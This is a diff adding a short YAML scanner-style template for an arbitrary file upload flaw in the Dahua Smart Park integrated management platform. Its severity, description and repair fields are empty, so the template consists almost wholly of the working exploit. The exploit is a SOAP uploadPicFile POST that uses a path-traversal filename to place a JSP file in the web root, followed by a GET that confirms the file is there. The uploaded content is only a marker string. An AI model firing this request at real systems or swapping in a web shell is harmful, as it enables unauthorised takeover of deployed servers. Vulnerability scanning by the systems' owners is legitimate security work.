@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 大华智慧园区综合管理平台 poi 任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /emap/webservice/gis/soap/poi
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: |
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+    <res:uploadPicFile>
+    <arg0>/../../test112.jsp</arg0>
+    <arg1>MTIzNDU2</arg1>
+    </res:uploadPicFile>
+    </soapenv:Body>
+    </soapenv:Envelope>
+response1:
+requests2:
+  method: GET
+  path: /upload/test112.jsp
+response2:
+  body:
+  code: 200
